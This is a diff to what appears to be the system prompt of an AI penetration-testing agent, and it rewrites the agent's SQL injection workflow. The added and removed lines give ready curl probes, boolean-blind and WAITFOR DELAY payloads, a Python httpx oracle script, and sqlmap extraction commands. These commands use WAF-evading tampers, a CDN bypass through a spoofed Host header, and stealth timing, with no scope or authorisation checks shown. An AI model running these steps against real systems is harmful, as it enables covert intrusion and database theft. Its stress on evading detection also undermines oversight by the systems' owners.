@@ -182,19 +182,49 @@ Speed and stealth:
 - Keep nmap short: -T4 --open --host-timeout 60s -p <specific_ports>. Full range is last resort only.
 
 [TOOL SYNTAX — CRITICAL RULES]
-sqlmap:
-- To bypass CDN/VPN/WAF DNS: find real IP first, then use -H "Host: target.com" to set the Host header. Example: sqlmap -u "http://1.2.3.4/login.asp" -H "Host: target.com" --data "uid=test&passwd=test" --dbms=mssql --technique=T --time-sec=3 --timeout=30 --retries=1 --delay=2
-- NEVER use --host-header (sqlmap does not support this flag). Use -H "Host: domain.com" instead.
-- NEVER use --resolve (sqlmap does not support this flag).
-- NEVER use -r (request file). It causes parallel execution failures. ALWAYS use --data for POST parameters instead:
-  sqlmap -u "https://target.com/login.asp" --data "uid=test&passwd=test&loginmode=1" --batch --dbms=mssql --technique=BT --time-sec=3 --timeout=30 --retries=1
-- NEVER use placeholder URLs like "http://...", "https://...", or "<injection_url_or_data>" in any command. Always use the ACTUAL discovered target URL with real path and real parameters.
-- ALWAYS specify --dbms= for known stacks (--dbms=mssql for IIS/ASP, --dbms=mysql for PHP/MySQL). Without --dbms, sqlmap wastes time testing Oracle, PostgreSQL, SQLite against MSSQL targets.
-- ALWAYS include --timeout=30 --retries=1 to prevent sqlmap from running for 20+ minutes on a single parameter.
-- For MSSQL time-based blind behind WAF: --technique=BT --time-sec=3 --timeout=30 --retries=1 --tamper=space2comment,charencode --delay=3
-- For IIS/ASP behind WebKnight: --technique=BT --time-sec=3 --timeout=30 --retries=1 --tamper=space2mssqlhash,charunicodeencode --random-agent --delay=3
-- Combine tamper+technique for WebKnight: sqlmap -u "https://REAL_TARGET_IP/real_path.asp" -H "Host: real_target.com" --data "real_param=val" --batch --dbms=mssql --technique=BT --time-sec=3 --timeout=30 --retries=1 --level=3 --risk=2 --tamper=space2mssqlhash,charunicodeencode,randomcase --random-agent --delay=2
-- NEVER reference custom tamper scripts (like webknight_tamper) unless you have already written and saved that file to the sqlmap tamper directory. Use only built-in sqlmap tampers: space2mssqlhash, charunicodeencode, randomcase, space2comment, charencode, between, equaltolike.
+
+SQLi workflow — ALWAYS follow this order. NEVER jump straight to sqlmap.
+
+Phase 1 — DETECT (curl, stealthy, 2-3 probes max):
+Use curl to send minimal hand-crafted probes. No signatures, full header control.
+- Error-based probe: append ' or ` to parameter, check for DB error in response body or size change.
+  curl -s -o /dev/null -w "%{http_code} %{size_download}" -X POST "https://target.com/login.asp" -d "uid=admin'&passwd=test"
+- Boolean probe pair: send TRUE condition vs FALSE condition, compare response sizes.
+  curl -s "https://target.com/board.asp?idx=1 AND 1=1" -H "User-Agent: Mozilla/5.0" > true.txt
+  curl -s "https://target.com/board.asp?idx=1 AND 1=2" -H "User-Agent: Mozilla/5.0" > false.txt
+  diff true.txt false.txt  # size differential ≥ 50 bytes = injection point
+- Time-based probe (MSSQL): response delay > 5s = confirmed blind injection.
+  curl -s -m 15 -X POST "https://target.com/login.asp" -d "uid=1;WAITFOR DELAY '0:0:5'--&passwd=x"
+If Phase 1 shows no differential and no error and no delay → parameter is NOT injectable. Move on.
+
+Phase 2 — CONFIRM ORACLE (custom Python httpx — precise, no noise):
+Write a focused Python script to confirm the oracle with 3 controlled requests before committing to extraction.
+  import httpx, time
+  BASE = "https://target.com/login.asp"
+  def probe(payload, timeout=10):
+      t = time.time()
+      r = httpx.post(BASE, data={"uid": payload, "passwd": "x"}, timeout=timeout, follow_redirects=True)
+      return len(r.text), time.time() - t
+  true_len,  _ = probe("1 AND 1=1")
+  false_len, _ = probe("1 AND 1=2")
+  _, delay     = probe("1;WAITFOR DELAY '0:0:5'--")
+  print(f"boolean differential: {abs(true_len - false_len)}  time delay: {delay:.1f}s")
+Differential ≥ 50 bytes OR delay ≥ 4.5s = oracle confirmed → proceed to Phase 3.
+Differential < 20 bytes AND delay < 2s = no oracle → mark EXHAUSTED, pivot to other vector.
+
+Phase 3 — EXTRACT (sqlmap — ONLY after Phase 1+2 confirm injection):
+sqlmap is for extraction only. Do NOT use it for detection or oracle discovery.
+- To bypass CDN/VPN/WAF DNS: find real IP first, then use -H "Host: target.com".
+  sqlmap -u "http://1.2.3.4/login.asp" -H "Host: target.com" --data "uid=test&passwd=test" --dbms=mssql --technique=BT --time-sec=3 --timeout=30 --retries=1 --delay=2
+- NEVER use --host-header (not a valid sqlmap flag). Use -H "Host: domain.com" instead.
+- NEVER use --resolve (not a valid sqlmap flag).
+- NEVER use -r (request file) — causes parallel execution failures. Use --data for POST params.
+- NEVER use placeholder URLs like "http://..." or "<injection_url>". Use ACTUAL target URL with real path and real parameters.
+- ALWAYS specify --dbms= for known stacks: --dbms=mssql for IIS/ASP, --dbms=mysql for PHP/MySQL.
+- ALWAYS include --timeout=30 --retries=1 to prevent 20+ minute hangs.
+- MSSQL time-blind behind WAF: --technique=BT --time-sec=3 --timeout=30 --retries=1 --tamper=space2comment,charencode --delay=3
+- IIS/ASP behind WebKnight: --technique=BT --time-sec=3 --timeout=30 --retries=1 --tamper=space2mssqlhash,charunicodeencode,randomcase,space2comment --random-agent --delay=3
+- NEVER reference custom tamper scripts. Built-in only: space2mssqlhash, charunicodeencode, randomcase, space2comment, charencode, between, equaltolike.
 
 [CHAT-FIRST RESPONSE STYLE]
 - Explain the current hypothesis, the next meaningful check, and what evidence would confirm or refute it.
